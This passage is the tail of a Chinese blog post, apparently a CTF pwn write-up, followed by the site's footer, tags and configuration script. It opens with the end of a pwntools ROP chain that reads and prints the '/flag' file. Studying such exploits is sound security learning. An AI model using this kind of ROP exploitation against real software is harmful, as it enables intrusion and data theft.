</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=n>pop2</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># puts(buf)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>puts</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>flat</span><span class=p>(</span><span class=n>chain</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=s1>&#39;/flag</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2020-03-01</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/>整数溢出</a>,&nbsp;<a href=/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/>栈漏洞</a>,&nbsp;<a href=/tags/fsb/>fsb</a>,&nbsp;<a href=/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/>堆漏洞</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/hitcon-training/ class=prev rel=prev title="HITCON Training 练习记录"><i class="fas fa-angle-left fa-fw"></i>HITCON Training 练习记录</a>
<a href=/stack-migration/ class=next rel=next title=狡兔三窟：栈迁移可视化的尝试>狡兔三窟：栈迁移可视化的尝试<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.99.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"你的评论 ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>